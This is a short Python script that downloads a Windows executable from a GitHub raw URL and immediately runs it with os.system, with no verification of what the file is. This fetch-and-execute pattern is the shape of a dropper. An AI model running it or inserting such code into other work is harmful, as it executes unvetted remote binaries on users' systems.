######
#Author Lord District
######


import os
import requests
import subprocess 

def launch(save_path):
    print(save_path)
    try:
        os.system(f"{save_path}")
        
    except:
        print("error")



def download_file(url, save_directory):
    response = requests.get(url)
    if response.status_code == 200:
        file_name = url.split("/")[-1]
        save_path = os.path.join(save_directory, file_name)
        with open(save_path, 'wb') as file:
            file.write(response.content)
        print("File downloaded successfully.")
        
        launch(save_path)
    else:
        print(f"Failed to download file. Status code: {response.status_code}")
        return None



# Example usage:
github_raw_url = "https://raw.githubusercontent.com/LopoDistrict/megaloptera/main/test/v3.2.2.exe"
                  
save_path = "test"
download_file(github_raw_url, save_path)